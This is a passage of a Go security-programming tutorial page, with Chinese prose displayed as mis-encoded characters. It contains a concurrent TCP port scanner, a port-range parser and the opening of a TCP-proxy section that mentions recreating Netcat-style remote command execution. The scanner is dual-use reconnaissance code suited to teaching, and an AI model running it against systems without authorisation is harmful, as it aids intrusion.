</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//fmt.Printf(&#34;Connect port:%d failed\n&#34;, j)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">results</span> <span style="color:#f92672">&lt;-</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">results</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">p</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#ae81ff">100</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">results</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">openports</span> []<span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; cap(<span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">results</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">results</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">openports</span> = append(<span style="color:#a6e22e">openports</span>, <span style="color:#a6e22e">port</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">results</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sort</span>.<span style="color:#a6e22e">Ints</span>(<span style="color:#a6e22e">openports</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">openports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">port</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ä¿®æ”¹å‡½æ•° worker(ports,.results chan int) ä»¥æ¥å—ä¸¤ä¸ªé€šé“ã€‚å…¶ä½™é€»è¾‘åŸºæœ¬ç›¸åŒï¼Œä¸åŒä¹‹å¤„åœ¨äºï¼šå¦‚æœç«¯å£å…³é—­ï¼Œåˆ™å°†å‘é€ä¸€ä¸ª 0 ï¼›å¦‚æœç«¯å£å¤„äºæ‰“å¼€çŠ¶æ€ï¼Œåˆ™å°†å‘é€ç«¯å£å·ã€‚å¦å¤–ï¼Œåˆ›å»ºä¸€ä¸ªå•ç‹¬çš„é€šé“ç”¨äºå°†ç»“æœä»å·¥äººç¨‹åºä¼ é€’åˆ°ä¸»çº¿ç¨‹ã€‚ç„¶åï¼Œå¯ä»¥ä½¿ç”¨åˆ‡ç‰‡ï¼Œå­˜å‚¨ç»“æœï¼Œä»¥ä¾¿ä»¥åè¿›è¡Œæ’åºã€‚æ¥ä¸‹æ¥ï¼Œéœ€è¦å•ç‹¬ä½¿ç”¨ä¸€ä¸ª goroutine æŠŠéœ€è¦æ¢æµ‹çš„ç«¯å£å·å‘é€ç»™å·¥äººï¼Œå› ä¸ºå·¥äººéœ€è¦åœ¨ç»“æœæ”¶é›†å¾ªç¯å‰å¼€å§‹å·¥ä½œã€‚</p>
<p>ç»“æœæ”¶é›†å¾ªç¯åœ¨ results é€šé“ä¸Šæ¥æ”¶ 1024 æ¬¡ã€‚å¦‚æœç»“æœä¸ç­‰äº 0 ï¼Œåˆ™ä¼šå°†å…¶è¿½åŠ åˆ°åˆ‡ç‰‡ã€‚å…³é—­é€šé“åï¼Œä½¿ç”¨ sort å¯¹å­˜å‚¨æ‰“å¼€ç«¯å£çš„åˆ‡ç‰‡è¿›è¡Œæ’åºã€‚å‰©ä¸‹çš„å°±æ˜¯å¾ªç¯åˆ‡ç‰‡å¹¶å°†æ‰“å¼€çš„ç«¯å£æ‰“å°åˆ°å±å¹•ä¸Šã€‚</p>
<p>ä¸€ä¸ªé«˜æ•ˆçš„ç«¯å£æ‰«æå™¨å°±æ­¤å®ç°ã€‚èŠ±ä¸€äº›æ—¶é—´å¤„ç†ä»£ç ï¼Œå°¤å…¶æ˜¯å·¥äººçš„æ•°é‡ã€‚å·¥äººçš„æ•°é‡è¶Šå¤šï¼Œç¨‹åºåº”æ‰§è¡Œå¾—è¶Šå¿«ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ·»åŠ è¿‡å¤šçš„å·¥äººï¼Œç»“æœå°±å¯èƒ½ä¼šå˜å¾—ä¸å¯é ã€‚å½“ç¼–å†™ä¾›å…¶ä»–äººä½¿ç”¨çš„å·¥å…·æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåˆç†çš„é»˜è®¤å€¼ï¼Œä»¥ç¡®ä¿ç»“æœçš„å¯é æ€§ã€‚ä¸è¿‡ï¼Œä½ è¿˜åº”å…è®¸ç”¨æˆ·é€‰æ‹©å·¥äººçš„æ•°é‡ã€‚</p>
<p>ä½ å¯ä»¥å¯¹è¯¥ç¨‹åºè¿›è¡Œä¸€äº›æ”¹è¿›ã€‚é¦–å…ˆï¼Œä¸ºæ‰«æçš„æ¯ä¸ªç«¯å£å‘é€ results é€šé“ï¼Œä½†ä½ ä¸å¿…éå¾—è¿™ä¹ˆåšï¼›ä½ è¿˜å¯ä»¥æŠŠä»£ç å†™å¾—å¤æ‚ä¸€ç‚¹ï¼Œå› ä¸ºå®ƒä½¿ç”¨é™„åŠ é€šé“ä¸ä»…æ˜¯ä¸ºäº†è·Ÿè¸ªå·¥äººï¼Œè€Œä¸”ä¸ºäº†èƒ½é€šè¿‡ç¡®ä¿æ‰€æœ‰ç»“æœæ”¶é›†çš„å®Œæˆæ¥<strong>é˜²æ­¢å‡ºç°ç«æ€æ¡ä»¶</strong>ã€‚å› ä¸ºè¿™æ˜¯ä»‹ç»æ€§çš„ä¸€ç« ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰æ„çœç•¥äº†è¿™äº›å†…å®¹ã€‚ä¸è¿‡ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œæˆ‘ä»¬å°†åœ¨ç¬¬3ç« ä¸­ä»‹ç»è¿™ç§æ¨¡å¼ã€‚å…¶æ¬¡ï¼Œä½ å¯èƒ½å¸Œæœ›æ‰«æå™¨èƒ½å¤Ÿè§£æç«¯å£å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚80ã€443ã€8080ã€21-25ã€‚å¦‚æœè¦æŸ¥çœ‹å…¶å®ç°ï¼Œè¯·å‚è§https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/ã€‚æˆ‘ä»¬å°†å…¶ä½œä¸ºç»ƒä¹ ä¾›è¯»è€…æ¢ç´¢ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">portformat</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;errors&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;strconv&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;strings&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">porterrmsg</span> = <span style="color:#e6db74">&#34;Invalid port specification&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// å¤„ç† 1-65535 ç±»å‹ï¼Œé€ä¸ªæ·»åŠ åˆ°æ‰«æçš„ç«¯å£åˆ‡ç‰‡ä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">dashSplit</span>(<span style="color:#a6e22e">sp</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">ports</span> <span style="color:#f92672">*</span>[]<span style="color:#66d9ef">int</span>) <span style="color:#66d9ef">error</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">sp</span>, <span style="color:#e6db74">&#34;-&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">dp</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">start</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">dp</span>[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">end</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">dp</span>[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">start</span> &gt; <span style="color:#a6e22e">end</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">start</span> &lt; <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">end</span> &gt; <span style="color:#ae81ff">65535</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> ; <span style="color:#a6e22e">start</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">end</span>; <span style="color:#a6e22e">start</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span> = append(<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">start</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// å°†ç«¯å£å­—ç¬¦ä¸²è½¬æ¢æˆ int ç±»å‹ï¼Œå¹¶æ·»åŠ åˆ°è¦æ‰«æçš„ç«¯å£åˆ‡ç‰‡ä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">p</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">ports</span> <span style="color:#f92672">*</span>[]<span style="color:#66d9ef">int</span>) <span style="color:#66d9ef">error</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> &lt; <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">i</span> &gt; <span style="color:#ae81ff">65535</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span> = append(<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Parse turns a string of ports separated by &#39;-&#39; or &#39;,&#39; and returns a slice of Ints.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">s</span> <span style="color:#66d9ef">string</span>) ([]<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;-&#34;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">sp</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">p</span>, <span style="color:#e6db74">&#34;-&#34;</span>) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dashSplit</span>(<span style="color:#a6e22e">p</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">p</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">sp</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">p</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;-&#34;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dashSplit</span>(<span style="color:#a6e22e">s</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">s</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="2æ„é€ tcpä»£ç†">2.æ„é€ TCPä»£ç†<a hidden class="anchor" aria-hidden="true" href="#2æ„é€ tcpä»£ç†">#</a></h2>
<p>ä¸Šä¸€èŠ‚ä¸»è¦ä»‹ç»å¦‚ä½•ä»å®¢æˆ·ç«¯çš„è§’åº¦ä½¿ç”¨netåŒ…ï¼Œè€Œæœ¬èŠ‚å°†ä»‹ç»ä½¿ç”¨å®ƒåˆ›å»ºTCPæœåŠ¡å™¨å’Œä¼ è¾“æ•°æ®çš„æ–¹æ³•ã€‚
æˆ‘ä»¬å°†é¦–å…ˆä»‹ç»å¦‚ä½•æ„å»ºå¿…è¦çš„å›æ˜¾æœåŠ¡å™¨ï¼ˆè¯¥æœåŠ¡å™¨ä»…å›æ˜¾ç»™å®šå“åº”åˆ°å®¢æˆ·ç«¯ï¼‰ï¼Œä¹‹åå°†ä»‹ç»æœ‰å…³ä¸¤ä¸ªè¾ƒä¸ºé€šç”¨çš„ç¨‹åºçš„çŸ¥è¯†ï¼Œå³å¦‚ä½•åˆ›å»ºTCPç«¯å£è½¬å‘å™¨ä»¥åŠå¦‚ä½•é‡æ–°åˆ›å»ºNetcatçš„â€œå®‰å…¨å·¨æ´â€ç”¨äºè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p>
<h3 id="21-ä½¿ç”¨-ioreader-å’Œ-iowriter">2.1 ä½¿ç”¨ io.Reader å’Œ io.Writer<a hidden class="anchor" aria-hidden="true" href="#21-ä½¿ç”¨-ioreader-å’Œ-iowriter">#</a></h3>
<p>è¦åˆ›å»ºæœ¬èŠ‚ä¸­çš„ç¤ºä¾‹ï¼Œæ— è®ºä½ ä½¿ç”¨çš„æ˜¯TCPã€HTTPã€æ–‡ä»¶ç³»ç»Ÿè¿˜æ˜¯ä»»ä½•å…¶ä»–æ–¹å¼ï¼Œéƒ½éœ€è¦ä½¿ç”¨ä¸¤ç§ç±»å‹ï¼šio.Reader å’Œ io.Writer ã€‚å¯¹äºæ‰€æœ‰è¾“å…¥/è¾“å‡º(I/O)ä»»åŠ¡æ¥è¯´ï¼Œè¿™ä¸¤ç§æ•°æ®ç±»å‹éƒ½æ˜¯å¿…ä¸å¯å°‘çš„ã€‚å®ƒä»¬æ˜¯ Go å†…ç½® io åŒ…çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯æ‰€æœ‰æœ¬åœ°æˆ–ç½‘ç»œæ•°æ®ä¼ è¾“çš„åŸºç¡€ã€‚è¿™ä¸¤ç§æ•°æ®ç±»å‹åœ¨ Go çš„æ–‡æ¡£ä¸­å®šä¹‰å¦‚ä¸‹ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Reader</span> <span style="color:#66d9ef">interface</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#a6e22e">n</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Writer</span> <span style="color:#66d9ef">interface</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#a6e22e">n</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ä»¥ä¸Šä¸¤ç§æ•°æ®ç±»å‹éƒ½è¢«å®šä¹‰ä¸ºæ¥å£ï¼Œè¿™æ„å‘³ç€å®ƒä»¬ä¸èƒ½ç›´æ¥è¢«å®ä¾‹åŒ–ã€‚è€Œæ˜¯æœ‰ æŸç§æ•°æ®ç±»å‹å®ç°ä¸Šè¿°çš„ Read æˆ– Write æ–¹æ³•ï¼Œè¯¥ Read æˆ– Write æ–¹æ³•æ‰èƒ½è¢«è§†ä¸º Reader æˆ– Writer</p>
<p>ä¾‹å¦‚ï¼Œä»¥ä¸‹è‡ªå®šä¹‰çš„ç»“æ„ä½“ç±»å‹ FooReader å¯ä»¥æ»¡è¶³çº¦å®šï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä»»ä½•æ¥å— Reader å’Œ Writer çš„åœ°æ–¹ä½¿ç”¨ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooReader</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ä»æŸå¤„ï¼ˆä»»ä½•åœ°æ–¹ï¼‰è¯»å–ä¸€äº›æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> len(<span style="color:#a6e22e">dataReadFromSomewhere</span>), <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// å°†æ•°æ®å†™å…¥æŸå¤„
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> len(<span style="color:#a6e22e">dataReadFromSomewhere</span>), <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
